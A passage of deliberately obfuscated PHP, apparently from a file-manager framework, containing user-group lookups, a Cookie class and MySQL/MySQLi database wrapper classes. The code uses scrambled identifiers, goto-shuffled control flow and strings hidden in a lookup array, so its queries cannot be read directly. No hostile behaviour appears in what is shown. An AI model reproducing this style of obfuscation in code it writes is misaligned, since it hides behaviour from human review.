$cº‹·–°œš[$bºÒÊï•ï[1870]] = array(); if (isset($D¥µ®¸–È¯[$cº‹·–°œš[$bºÒÊï•ï[1531]]])) { $cº‹·–°œš[$bºÒÊï•ï[1870]] = $D¥µ®¸–È¯[$cº‹·–°œš[$bºÒÊï•ï[1531]]]; } } unset($cº‹·–°œš); goto eÆô–ÌÜ²; câ½»§¨§¸: $bºÒÊï•ï =& $_SERVER[…ë˜õ]; $BŠ¹¦˜çŠ = array($bºÒÊï•ï[1531] => array($bºÒÊï•ï[7], $FÃŒã˜Íó)); $D¥µ®¸–È¯ = Model($bºÒÊï•ï[1777])->where($BŠ¹¦˜çŠ)->select(); goto Bæª¹ˆ„ì; Bæª¹ˆ„ì: $aØà‡¦ğ•î = array_to_keyvalue($D¥µ®¸–È¯, $bºÒÊï•ï[33], $bºÒÊï•ï[1694]); $aØà‡¦ğ•î = array_remove_value(array_unique($aØà‡¦ğ•î), $bºÒÊï•ï[491]); if (!$aØà‡¦ğ•î || !$D¥µ®¸–È¯) { return; } goto c‚¥ëèÎŞÊ; c‚¥ëèÎŞÊ: $BŠ¹¦˜çŠ = array($bºÒÊï•ï[1694] => array($bºÒÊï•ï[7], $aØà‡¦ğ•î)); $BÕÛ§×õÁ’ = Model($bºÒÊï•ï[1868])->field($bºÒÊï•ï[2161])->where($BŠ¹¦˜çŠ)->select(); $BÕÛ§×õÁ’ = array_to_keyvalue($BÕÛ§×õÁ’, $bºÒÊï•ï[1694]); goto AÉÎòĞ¤óŸ; eÆô–ÌÜ²: } private function _listAppendMeta(&$DÛ³ƒÜÄ‰Ş, $DƒÑÃ›¨») { goto EãÉçâäÏ; d§ƒñÎ­Ò: foreach ($DÛ³ƒÜÄ‰Ş as &$DÂÒØ¤Âå) { $b·¤ñ¶Ÿæ¤ = array(); if (isset($D¨¥ŸÊÄ§İ[$DÂÒØ¤Âå[$B‡‚¥Š¥ˆœ[1531]]])) { $b·¤ñ¶Ÿæ¤ = $D¨¥ŸÊÄ§İ[$DÂÒØ¤Âå[$B‡‚¥Š¥ˆœ[1531]]]; } $DÂÒØ¤Âå[$B‡‚¥Š¥ˆœ[2164]] = array(); if (isset($b·¤ñ¶Ÿæ¤[$EôÆ¼Í¥ˆª])) { $DÂÒØ¤Âå[$B‡‚¥Š¥ˆœ[2164]] = $E™Õãë´«->getUserJobInfo($b·¤ñ¶Ÿæ¤[$EôÆ¼Í¥ˆª]); } } unset($DÂÒØ¤Âå); goto a†©øì”÷‚; EãÉçâäÏ: $B‡‚¥Š¥ˆœ =& $_SERVER[…ë˜õ]; $EôÆ¼Í¥ˆª = UserJobModel::JOB_KEY; $dáÀ›æÌ‹Ä = array($B‡‚¥Š¥ˆœ[2140]); goto Aê™ÍÃŞœÓ; Aê™ÍÃŞœÓ: $E±É¤ô²¨„ = array($B‡‚¥Š¥ˆœ[1531] => array($B‡‚¥Š¥ˆœ[7], $DƒÑÃ›¨»)); $D¨¥ŸÊÄ§İ = Model($B‡‚¥Š¥ˆœ[2138])->where($E±É¤ô²¨„)->select(); $D¨¥ŸÊÄ§İ = array_to_keyvalue_group($D¨¥ŸÊÄ§İ, $B‡‚¥Š¥ˆœ[1531]); goto eøŞ§Ğ¾äƒ; eøŞ§Ğ¾äƒ: foreach ($D¨¥ŸÊÄ§İ as &$F°Şèœù˜¦) { $C´è±ñ = array(); foreach ($F°Şèœù˜¦ as $CâçÒë„›) { if (!in_array($CâçÒë„›[$B‡‚¥Š¥ˆœ[92]], $dáÀ›æÌ‹Ä)) { $C´è±ñ[$CâçÒë„›[$B‡‚¥Š¥ˆœ[92]]] = $CâçÒë„›[$B‡‚¥Š¥ˆœ[370]]; } } $F°Şèœù˜¦ = $C´è±ñ; } unset($F°Şèœù˜¦); $E™Õãë´« = Model($B‡‚¥Š¥ˆœ[2163]); goto d§ƒñÎ­Ò; a†©øì”÷‚: } protected function groupUserAll($eòŸ„İ¸) { $fÁ»Âåƒµ =& $_SERVER[…ë˜õ]; if (!$eòŸ„İ¸) { return !1; } $bÃ·Àîï†³ = Model($fÁ»Âåƒµ[1777])->field($fÁ»Âåƒµ[1531])->where(array($fÁ»Âåƒµ[1694] => array($fÁ»Âåƒµ[7], $eòŸ„İ¸)))->select(); $bÃ·Àîï†³ = array_to_keyvalue($bÃ·Àîï†³, $fÁ»Âåƒµ[33], $fÁ»Âåƒµ[1531]); return array_unique($bÃ·Àîï†³); } public function userSearch($bæòŸÛ¼øÉ, $cò¨”æÓ† = "\x2a") { return Model($_SERVER[…ë˜õ][501])->where($bæòŸÛ¼øÉ)->field($cò¨”æÓ†)->find(); } } goto bÕœ¶µÀåâ; fì°©Ä«¤: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($d§‹Š£šÚ = '', $D …Óò¢™Ğ = 0) { if (is_string($d§‹Š£šÚ) && $d§‹Š£šÚ != $_SERVER[…ë˜õ][33]) { $this->prefix = $d§‹Š£šÚ; } if (is_numeric($D …Óò¢™Ğ) && $D …Óò¢™Ğ > 0) { $this->expire = $D …Óò¢™Ğ; } } public static function getInstance() { static $CÚÑîöë†Å; if ($CÚÑîöë†Å === null) { $CÚÑîöë†Å = new self(); } return $CÚÑîöë†Å; } private static $cookieDisable = false; public static function disable($a¬É™„ÒÓë) { self::$cookieDisable = $a¬É™„ÒÓë; } private static $sameCookieSet = array(); public static function set($D˜µß©ø‚é, $E È—ˆ­•, $C°ˆ¤ŞšÒ = 0, $BŠ¸ñĞîœ = false, $C®ãò°®œ = false) { goto A‹°Š¨÷‚›; A‹°Š¨÷‚›: $F…Ğ³ï«„ =& $_SERVER[…ë˜õ]; if (self::$cookieDisable) { return; } if (!$C°ˆ¤ŞšÒ) { $C°ˆ¤ŞšÒ = 24 * 3600 * 7; } goto fñâÈŞÏ°¡; FæÓâ±è£¸: $DÁ¬«º¾Òò = $F…Ğ³ï«„[33]; setcookie($D˜µß©ø‚é, $E È—ˆ­•, time() + $C°ˆ¤ŞšÒ, $F…Ğ³ï«„[8] . trim($C®ãò°®œ, $F…Ğ³ï«„[8]) . $DÁ¬«º¾Òò, !1, !1, $BŠ¸ñĞîœ); goto D†‰êæ·ñ; fñâÈŞÏ°¡: if (isset(self::$sameCookieSet[$D˜µß©ø‚é]) && self::$sameCookieSet[$D˜µß©ø‚é] == $E È—ˆ­• . $C°ˆ¤ŞšÒ) { return; } self::$sameCookieSet[$D˜µß©ø‚é] = $E È—ˆ­• . $C°ˆ¤ŞšÒ; if (!$C®ãò°®œ) { $C®ãò°®œ = str_replace(HOST, $F…Ğ³ï«„[33], APP_HOST); $C®ãò°®œ = _get($GLOBALS, $F…Ğ³ï«„[850], $C®ãò°®œ); } goto FæÓâ±è£¸; D†‰êæ·ñ: } public static function setSafe($e¨æ—æå‰Î, $B³êà³Í´™, $BØˆÄ¸õãÛ = 0) { self::set($e¨æ—æå‰Î, $B³êà³Í´™, $BØˆÄ¸õãÛ, !0); } public static function get($c–ˆ¦Í«Œº) { return isset($_COOKIE[$c–ˆ¦Í«Œº]) ? $_COOKIE[$c–ˆ¦Í«Œº] : !1; } public static function remove($F‹ˆÆ¦¹ò¿, $b‡»°­Õƒó = false) { unset($_COOKIE[$F‹ˆÆ¦¹ò¿]); self::set($F‹ˆÆ¦¹ò¿, $_SERVER[…ë˜õ][33], 1, $b‡»°­Õƒó); } } class DbMysql extends Db { public function __construct($d‰òïó“Ÿƒ = '') { $F‹ÚŒ×†Ş =& $_SERVER[…ë˜õ]; if (!extension_loaded($F‹ÚŒ×†Ş[771])) { think_exception(think_lang($F‹ÚŒ×†Ş[10]) . $F‹ÚŒ×†Ş[851]); } if (!empty($d‰òïó“Ÿƒ)) { $this->config = $d‰òïó“Ÿƒ; if (empty($this->config[$F‹ÚŒ×†Ş[13]])) { $this->config[$F‹ÚŒ×†Ş[13]] = $F‹ÚŒ×†Ş[33]; } } } public function connect($eƒù‰±®™ù = '', $c¬‹ô†“°£ = 0, $A³‡­Û­Ğ = false) { $FêÅ‹šš” =& $_SERVER[…ë˜õ]; if (!isset($this->linkID[$c¬‹ô†“°£])) { goto AÇÇãáíí—; F±ÈÚš‹Ã: if ($F‰‡¸È•½Á) { $this->linkID[$c¬‹ô†“°£] = mysql_pconnect($a„‹˜éØ”ê, $eƒù‰±®™ù[$FêÅ‹šš”[854]], $eƒù‰±®™ù[$FêÅ‹šš”[855]], 131072); } else { $this->linkID[$c¬‹ô†“°£] = mysql_connect($a„‹˜éØ”ê, $eƒù‰±®™ù[$FêÅ‹šš”[854]], $eƒù‰±®™ù[$FêÅ‹šš”[855]], !0, 131072); } if (!$this->linkID[$c¬‹ô†“°£] || !empty($eƒù‰±®™ù[$FêÅ‹šš”[17]]) && !mysql_select_db($eƒù‰±®™ù[$FêÅ‹šš”[17]], $this->linkID[$c¬‹ô†“°£])) { think_exception(mysql_error()); } $E×ÄÄ´…¾Â = mysql_get_server_info($this->linkID[$c¬‹ô†“°£]); goto cµç†ùÙĞß; FÁˆ»‹øˆ”: if (1 != think_config($FêÅ‹šš”[18])) { unset($this->config); } goto C‡óø³›Æ; AÇÇãáíí—: if (empty($eƒù‰±®™ù)) { $eƒù‰±®™ù = $this->config; } $a„‹˜éØ”ê = $eƒù‰±®™ù[$FêÅ‹šš”[852]] . ($eƒù‰±®™ù[$FêÅ‹šš”[853]] ? "\72{$eƒù‰±®™ù[$FêÅ‹šš”[853]]}" : $FêÅ‹šš”[33]); $F‰‡¸È•½Á = !empty($eƒù‰±®™ù[$FêÅ‹šš”[13]][$FêÅ‹šš”[14]]) ? $eƒù‰±®™ù[$FêÅ‹šš”[13]][$FêÅ‹šš”[14]] : $this->pconnect; goto F±ÈÚš‹Ã; cµç†ùÙĞß: mysql_query($FêÅ‹šš”[856] . think_config($FêÅ‹šš”[857]) . $FêÅ‹šš”[55], $this->linkID[$c¬‹ô†“°£]); if ($E×ÄÄ´…¾Â > $FêÅ‹šš”[858]) { mysql_query($FêÅ‹šš”[859], $this->linkID[$c¬‹ô†“°£]); } $this->connected = !0; goto FÁˆ»‹øˆ”; C‡óø³›Æ: } return $this->linkID[$c¬‹ô†“°£]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($D›Üá¹¡) { goto A¨£Ö‘ÙÁ; Bêš§‚ù¿•: if (!$this->_linkID) { return !1; } $this->queryStr = $D›Üá¹¡; if ($this->queryID) { $this->free(); } goto Dİî°‘ñ•¦; e¨ƒÆ§åÜã: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto c¤ö§ÀëÛ; A¨£Ö‘ÙÁ: $aá®¾…ë¤Æ =& $_SERVER[…ë˜õ]; if (0 === stripos($D›Üá¹¡, $aá®¾…ë¤Æ[260])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto Bêš§‚ù¿•; Dİî°‘ñ•¦: think_action_status($aá®¾…ë¤Æ[19], 1); think_status($aá®¾…ë¤Æ[20]); $this->queryID = mysql_query($D›Üá¹¡, $this->_linkID); goto e¨ƒÆ§åÜã; c¤ö§ÀëÛ: } public function execute($F¦ã¨…ä¬) { goto C«¦°”¶¯®; BÜ˜®º„©™: $this->queryStr = $F¦ã¨…ä¬; if ($this->queryID) { $this->free(); } think_action_status($eæ’çòÙƒˆ[21], 1); goto Bã•ƒõ¬ø¨; C«¦°”¶¯®: $eæ’çòÙƒˆ =& $_SERVER[…ë˜õ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto BÜ˜®º„©™; Bã•ƒõ¬ø¨: think_status($eæ’çòÙƒˆ[20]); $FŸææËãğš = mysql_query($F¦ã¨…ä¬, $this->_linkID); $this->debug(); goto dàï„ìóÓÏ; dàï„ìóÓÏ: if (!1 === $FŸææËãğš) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto f—ÎÍ¢Îõ; f—ÎÍ¢Îõ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[…ë˜õ][860], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $bëšÙ™›ƒ‰ = mysql_query($_SERVER[…ë˜õ][861], $this->_linkID); $this->transTimes = 0; if (!$bëšÙ™›ƒ‰) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $E„¯İ¶¥… = mysql_query($_SERVER[…ë˜õ][862], $this->_linkID); $this->transTimes = 0; if (!$E„¯İ¶¥…) { $this->error(); return !1; } } return !0; } private function getAll() { $eè„²Øôé¿ = array(); if ($this->numRows > 0) { while ($Eô“¿Õ‰Âõ = mysql_fetch_assoc($this->queryID)) { $eè„²Øôé¿[] = $Eô“¿Õ‰Âõ; } mysql_data_seek($this->queryID, 0); } return $eè„²Øôé¿; } public function getFields($cÜ¦äÅ„·ğ) { $A¦‹ÓëÙˆ =& $_SERVER[…ë˜õ]; $D¦¶ñëİØä = $this->query($A¦‹ÓëÙˆ[863] . $this->parseKey($cÜ¦äÅ„·ğ)); $A„Øéµñ‹§ = array(); if ($D¦¶ñëİØä) { foreach ($D¦¶ñëİØä as $EãÙ®è­Äã => $fÁ»Ï®É“ƒ) { $A„Øéµñ‹§[$fÁ»Ï®É“ƒ[$A¦‹ÓëÙˆ[27]]] = array($A¦‹ÓëÙˆ[28] => $fÁ»Ï®É“ƒ[$A¦‹ÓëÙˆ[27]], $A¦‹ÓëÙˆ[29] => $fÁ»Ï®É“ƒ[$A¦‹ÓëÙˆ[30]], $A¦‹ÓëÙˆ[31] => (bool) (strtoupper($fÁ»Ï®É“ƒ[$A¦‹ÓëÙˆ[32]]) === $A¦‹ÓëÙˆ[864]), $A¦‹ÓëÙˆ[34] => $fÁ»Ï®É“ƒ[$A¦‹ÓëÙˆ[35]], $A¦‹ÓëÙˆ[36] => strtolower($fÁ»Ï®É“ƒ[$A¦‹ÓëÙˆ[37]]) == $A¦‹ÓëÙˆ[38], $A¦‹ÓëÙˆ[39] => strtolower($fÁ»Ï®É“ƒ[$A¦‹ÓëÙˆ[40]]) == $A¦‹ÓëÙˆ[41]); } } return $A„Øéµñ‹§; } public function getTables($C¥‰İˆë = '') { $f”ò¸Âß³Ê =& $_SERVER[…ë˜õ]; if (!empty($C¥‰İˆë)) { $FŠ‹áŒ’‘ = $f”ò¸Âß³Ê[865] . $C¥‰İˆë . $f”ò¸Âß³Ê[866]; } else { $FŠ‹áŒ’‘ = $f”ò¸Âß³Ê[867]; } $A–ÄÁÙ¾¨ = $this->query($FŠ‹áŒ’‘); $EÎÌ¤ğñµ = array(); foreach ($A–ÄÁÙ¾¨ as $CóŸÀ´Ë­Ö => $Cæ©‚°²†‡) { $EÎÌ¤ğñµ[$CóŸÀ´Ë­Ö] = current($Cæ©‚°²†‡); } return $EÎÌ¤ğñµ; } public function replace($fª«Ìó¿ƒö, $bØ¾¬©ŸÂ“ = array()) { $C¸Œ½¡“ßˆ =& $_SERVER[…ë˜õ]; foreach ($fª«Ìó¿ƒö as $aÃµ›“ˆ‰É => $f´×Šñ‚¾) { $D†½Õ‰®× = $this->parseValue($f´×Šñ‚¾); if (is_scalar($D†½Õ‰®×)) { $Bä™‡“Ââ[] = $D†½Õ‰®×; $E–µŠÃ†[] = $this->parseKey($aÃµ›“ˆ‰É); } } $d½‰Ø³ŞØÆ = $C¸Œ½¡“ßˆ[868] . $this->parseTable($bØ¾¬©ŸÂ“[$C¸Œ½¡“ßˆ[275]]) . $C¸Œ½¡“ßˆ[869] . implode($C¸Œ½¡“ßˆ[47], $E–µŠÃ†) . $C¸Œ½¡“ßˆ[870] . implode($C¸Œ½¡“ßˆ[47], $Bä™‡“Ââ) . $C¸Œ½¡“ßˆ[871]; return $this->execute($d½‰Ø³ŞØÆ); } public function insertAll($Cà—Œ½îé§, $cÉä™ß¨†ˆ = array(), $B‹ªåÂ‰´Ñ = false) { goto c àø”ˆâ; A¸àôºÍ“¹: $Aš¾·ùñÀÈ = array(); foreach ($Cà—Œ½îé§ as $F™¿ƒãÊ²Š) { $E­ª±ùÄ¦ê = array(); foreach ($F™¿ƒãÊ²Š as $E‚à„”¯ì™ => $c‡¥±»µÇä) { $c‡¥±»µÇä = $this->parseValue($c‡¥±»µÇä); if (is_scalar($c‡¥±»µÇä)) { $E­ª±ùÄ¦ê[] = $c‡¥±»µÇä; } } $Aš¾·ùñÀÈ[] = $CÚÅ¿‰’©æ[256] . implode($CÚÅ¿‰’©æ[47], $E­ª±ùÄ¦ê) . $CÚÅ¿‰’©æ[871]; } array_walk($A’­„’Ÿ«, array($this, $CÚÅ¿‰’©æ[872])); goto eâñ¤…ÏòÜ; c àø”ˆâ: $CÚÅ¿‰’©æ =& $_SERVER[…ë˜õ]; if (!is_array($Cà—Œ½îé§[0])) { return !1; } $A’­„’Ÿ« = array_keys($Cà—Œ½îé§[0]); goto A¸àôºÍ“¹; eâñ¤…ÏòÜ: $bÙÑö¥Õ ö = ($B‹ªåÂ‰´Ñ ? $CÚÅ¿‰’©æ[873] : $CÚÅ¿‰’©æ[874]) . $CÚÅ¿‰’©æ[875] . $this->parseTable($cÉä™ß¨†ˆ[$CÚÅ¿‰’©æ[275]]) . $CÚÅ¿‰’©æ[869] . implode($CÚÅ¿‰’©æ[47], $A’­„’Ÿ«) . $CÚÅ¿‰’©æ[876] . implode($CÚÅ¿‰’©æ[47], $Aš¾·ùñÀÈ); return $this->execute($bÙÑö¥Õ ö); goto eÈèšØ‚¾; eÈèšØ‚¾: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $eÆèÜÌíˆÊ =& $_SERVER[…ë˜õ]; $this->error = mysql_errno() . $eÆèÜÌíˆÊ[4] . mysql_error($this->_linkID); if ($eÆèÜÌíˆÊ[33] != $this->queryStr) { $this->error .= LNG($eÆèÜÌíˆÊ[45]) . $this->queryStr; } think_trace($this->error, $eÆèÜÌíˆÊ[33], $eÆèÜÌíˆÊ[46]); return $this->error; } public function escapeString($b¹Ê²›¡º) { if ($this->_linkID) { return mysql_real_escape_string($b¹Ê²›¡º, $this->_linkID); } else { return mysql_escape_string($b¹Ê²›¡º); } } public function parseKey(&$C„ÈÒ¸é¬, $e¥›é¬…ãÓ = true) { $e©²“×¢Øé =& $_SERVER[…ë˜õ]; if ($e¥›é¬…ãÓ) { $C„ÈÒ¸é¬ = $this->parseKeyCheck($C„ÈÒ¸é¬); } if ($C„ÈÒ¸é¬ != $e©²“×¢Øé[181] && !preg_match($e©²“×¢Øé[877], $C„ÈÒ¸é¬)) { $C„ÈÒ¸é¬ = $e©²“×¢Øé[380] . trim($C„ÈÒ¸é¬, $e©²“×¢Øé[380]) . $e©²“×¢Øé[380]; } return $C„ÈÒ¸é¬; } } class DbMysqli extends Db { public function __construct($Aİ‘°¼­†ô = '') { $d¶¾±õİ™œ =& $_SERVER[…ë˜õ]; if (!extension_loaded($d¶¾±õİ™œ[770])) { think_exception(think_lang($d¶¾±õİ™œ[10]) . $d¶¾±õİ™œ[878]); } if (!empty($Aİ‘°¼­†ô)) { $this->config = $Aİ‘°¼­†ô; if (empty($this->config[$d¶¾±õİ™œ[13]])) { $this->config[$d¶¾±õİ™œ[13]] = $d¶¾±õİ™œ[33]; } } } public function connect($cÎ½îÀªè = '', $cÑâòŒâ¥¨ = 0) { $eº…ëÎ¶—¥ =& $_SERVER[…ë˜õ]; if (!isset($this->linkID[$cÑâòŒâ¥¨])) { goto BŠÉõç±ùŠ; a´—¾Îİ÷Ù: $bÃ¾êŞ¢ÍÒ = $this->linkID[$cÑâòŒâ¥¨]->server_version; $this->linkID[$cÑâòŒâ¥¨]->query($eº…ëÎ¶—¥[856] . think_config($eº…ëÎ¶—¥[857]) . $eº…ëÎ¶—¥[55]); if ($bÃ¾êŞ¢ÍÒ > $eº…ëÎ¶—¥[858]) { $this->linkID[$cÑâòŒâ¥¨]->query($eº…ëÎ¶—¥[859]); } goto F–ö³ŠÁ; F–ö³ŠÁ: $this->connected = !0; if (1 != think_config($eº…ëÎ¶—¥[18])) { unset($this->config); } goto eä“ë™Õ°£; BŠÉõç±ùŠ: if (empty($cÎ½îÀªè)) { $cÎ½îÀªè = $this->config; } $this->linkID[$cÑâòŒâ¥¨] = new mysqli($cÎ½îÀªè[$eº…ëÎ¶—¥[852]], $cÎ½îÀªè[$eº…ëÎ¶—¥[854]], $cÎ½îÀªè[$eº…ëÎ¶—¥[855]], $cÎ½îÀªè[$eº…ëÎ¶—¥[17]], $cÎ½îÀªè[$eº…ëÎ¶—¥[853]] ? intval($cÎ½îÀªè[$eº…ëÎ¶—¥[853]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto a´—¾Îİ÷Ù; eä“ë™Õ°£: } return $this->linkID[$cÑâòŒâ¥¨]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($EèˆÉ¬Û’Ï) { goto d½…¡†÷²; d½…¡†÷²: $A§Ä¯™í¹ =& $_SERVER[…ë˜õ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto dá•·íÔ; D«…¨µÎõ: think_status($A§Ä¯™í¹[20]); $this->queryID = $this->_linkID->query($EèˆÉ¬Û’Ï); if ($this->_linkID->more_results()) { while (($Fê®à‡’©‹ = $this->_linkID->next_result()) != NULL) { $Fê®à‡’©‹->free_result(); } } goto e©Ü¾ƒŒÁÉ; e©Ü¾ƒŒÁÉ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto E·Ûê“©÷; dá•·íÔ: $this->queryStr = $EèˆÉ¬Û’Ï; if ($this->queryID) { $this->free(); } think_action_status($A§Ä¯™í¹[19], 1); goto D«…¨µÎõ; E·Ûê“©÷: } public function execute($EĞÎØôîŠ†) { goto A‚ˆºÉÏĞ; A¼¢ÁÑğÕ: think_status($f„÷áæÀ‡‡[20]); $cê©¢ë¹Õ‘ = $this->_linkID->query($EĞÎØôîŠ†); $this->debug(); goto AªÖéÎ­¥¼; A‚ˆºÉÏĞ: $f„÷áæÀ‡‡ =& $_SERVER[…ë˜õ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto föÂÌ†Ñ”¾; AªÖéÎ­¥¼: if (!1 === $cê©¢ë¹Õ‘) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto dÈ–ÈÊ¶Ô±; föÂÌ†Ñ”¾: $this->queryStr = $EĞÎØôîŠ†; if ($this->queryID) { $this->free(); } think_action_status($f„÷áæÀ‡‡[21], 1); goto A¼¢ÁÑğÕ; dÈ–ÈÊ¶Ô±: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $eØá°‰¢Ö = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$eØá°‰¢Ö) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $B„ïïŸ¶õã = $this->_linkID->rollback(); $this->transTimes = 0; if (!$B„ïïŸ¶õã) { $this->error(); return !1; } } return !0; } private function getAll() { $A˜¶Â«Ô¸ğ = array(); if ($this->numRows > 0) { for ($A×©¨ºÒï = 0; $A×©¨ºÒï < $this->numRows; $A×©¨ºÒï++) { $A˜¶Â«Ô¸ğ[$A×©¨ºÒï] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $A˜¶Â«Ô¸ğ; } public function getFields($aŠìšÎ³) { $b³±Ÿ­™ËÃ =& $_SERVER[…ë˜õ]; $FÄÍÈÕóĞÒ = $this->query($b³±Ÿ­™ËÃ[863] . $this->parseKey($aŠìšÎ³)); $d¡ÙŠÉÁ†¦ = array(); if ($FÄÍÈÕóĞÒ) { foreach ($FÄÍÈÕóĞÒ as $Fë­¯Ò¾ => $F“Ê¬‹È ¢) { $d¡ÙŠÉÁ†¦[$F“Ê¬‹È ¢[$b³±Ÿ­™ËÃ[27]]] = array($b³±Ÿ­™ËÃ[28] => $F“Ê¬‹È ¢[$b³±Ÿ­™ËÃ[27]], $b³±Ÿ­™ËÃ[29] => $F“Ê¬‹È ¢[$b³±Ÿ­™ËÃ[30]], $b³±Ÿ­™ËÃ[31] => (bool) ($F“Ê¬‹È ¢[$b³±Ÿ­™ËÃ[32]] === $b³±Ÿ­™ËÃ[33]), $b³±Ÿ­™ËÃ[34] => $F“Ê¬‹È ¢[$b³±Ÿ­™ËÃ[35]], $b³±Ÿ­™ËÃ[36] => strtolower($F“Ê¬‹È ¢[$b³±Ÿ­™ËÃ[37]]) == $b³±Ÿ­™ËÃ[38], $b³±Ÿ­™ËÃ[39] => strtolower($F“Ê¬‹È ¢[$b³±Ÿ­™ËÃ[40]]) == $b³±Ÿ­™ËÃ[41]); } } return $d¡ÙŠÉÁ†¦; } public function getTables($F„‹ñ»á¬Ù = '') { $b¼ï™Óß‰ =& $_SERVER[…ë˜õ]; $a ÇŸë›õ˜ = !empty($F„‹ñ»á¬Ù) ? $b¼ï™Óß‰[865] . $F„‹ñ»á¬Ù . $b¼ï™Óß‰[866] : $b¼ï™Óß‰[867]; $BÓéáá–éö = $this->query($a ÇŸë›õ˜); $DƒÑ»õ°£« = array(); if ($BÓéáá–éö) { foreach ($BÓéáá–éö as $eù½êø¼º¸ => $fš—Û¤„¨) { $DƒÑ»õ°£«[$eù½êø¼º¸] = current($fš—Û¤„¨); } } return $DƒÑ»õ°£«; } public function replace($E…¨ç†‚‹–, $aŸ„Ö¿Œ†¿ = array()) { $dÙ÷Ÿ¹ò­¦ =& $_SERVER[…ë˜õ]; foreach ($E…¨ç†‚‹– as $Eİù´Ö¹‚æ => $b‡­ß °™‚) { $dê‚Ü”Ÿ‘ä = $this->parseValue($b‡­ß °™‚); if (is_scalar($dê‚Ü”Ÿ‘ä)) { $ağ†šïÅËÑ[] = $dê‚Ü”Ÿ‘ä; $BˆÈÙ”Ü‹ì[] = $this->parseKey($Eİù´Ö¹‚æ); } } $aÔ±œœë§ = $dÙ÷Ÿ¹ò­¦[868] . $this->parseTable($aŸ„Ö¿Œ†¿[$dÙ÷Ÿ¹ò­¦[275]]) . $dÙ÷Ÿ¹ò­¦[869] . implode($dÙ÷Ÿ¹ò­¦[47], $BˆÈÙ”Ü‹ì) . $dÙ÷Ÿ¹ò­¦[870] . implode($dÙ÷Ÿ¹ò­¦[47], $ağ†šïÅËÑ) . $dÙ÷Ÿ¹ò­¦[871]; return $this->execute($aÔ±œœë§); } public function insertAll($cŸÛĞØÔÔ§, $c˜‰©ß¥§ = array(), $D¦Üö­È÷ = false) { goto eÅÄè£³ƒ; Fòœ¾ÛÖŒ: $b‚ÓéÖ¯¥ = array(); foreach ($cŸÛĞØÔÔ§ as $DÔè³éÜ×Ö) { $b“åºŠ„ˆ™ = array(); foreach ($DÔè³éÜ×Ö as $Aµ‰ÌÊà½Ø => $dõÊ·Ï¬) { $dõÊ·Ï¬ = $this->parseValue($dõÊ·Ï¬); if (is_scalar($dõÊ·Ï¬)) { $b“åºŠ„ˆ™[] = $dõÊ·Ï¬; } } $b‚ÓéÖ¯¥[] = $cŠÇ¨²×Š…[256] . implode($cŠÇ¨²×Š…[47], $b“åºŠ„ˆ™) . $cŠÇ¨²×Š…[871]; } array_walk($dÌÁ¯õ³, array($this, $cŠÇ¨²×Š…[872])); goto bĞß†×°˜Š; eÅÄè£³ƒ: $cŠÇ¨²×Š… =& $_SERVER[…ë˜õ]; if (!is_array($cŸÛĞØÔÔ§[0])) { return !1; } $dÌÁ¯õ³ = array_keys($cŸÛĞØÔÔ§[0]); goto Fòœ¾ÛÖŒ; bĞß†×°˜Š: $D‰éë = $D¦Üö­È÷ ? $cŠÇ¨²×Š…[873] : $cŠÇ¨²×Š…[874]; $aÄ²ï¥˜ = $D‰éë . $cŠÇ¨²×Š…[875] . $this->parseTable($c˜‰©ß¥§[$cŠÇ¨²×Š…[275]]) . $cŠÇ¨²×Š…[869] . implode($cŠÇ¨²×Š…[47], $dÌÁ¯õ³) . $cŠÇ¨²×Š…[876] . implode($cŠÇ¨²×Š…[47], $b‚ÓéÖ¯¥); return $this->execute($aÄ²ï¥˜); goto eñ‹²ÄŠ‚˜; eñ‹²ÄŠ‚˜: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $F··Ù®ëÊ¦ =& $_SERVER[…ë˜õ]; $this->error = $this->_linkID->errno . $F··Ù®ëÊ¦[4] . $this->_linkID->error; if ($F··Ù®ëÊ¦[33] != $this->queryStr) { $this->error .= LNG($F··Ù®ëÊ¦[45]) . $this->queryStr; } think_trace($this->error, $F··Ù®ëÊ¦[33], $F··Ù®ëÊ¦[46]); return $this->error; } public function escapeString($E²İé¦×š) { if ($this->_linkID) { return $this->_linkID->real_escape_string($E²İé¦×š); } else { return addslashes($E²İé¦×š); } } public function parseKey(&$aÍÕÅ½åí½, $C½ÀÆ®¡¹º = true) { $b¶½‡Ò÷¨ =& $_SERVER[…ë˜õ]; if ($C½ÀÆ®¡¹º) { $aÍÕÅ½åí½ = $this->parseKeyCheck($aÍÕÅ½åí½); } if ($aÍÕÅ½åí½ != $b¶½‡Ò÷¨[181] && !preg_match($b¶½‡Ò÷¨[877], $aÍÕÅ½åí½)) { $aÍÕÅ½åí½ = $b¶½‡Ò÷¨[380] . trim($aÍÕÅ½åí½, $b¶½‡Ò÷¨[380]) . $b¶½‡Ò÷¨[380]; } return $aÍÕÅ½åí½; } } goto F¾¦ÙÔ§äç; 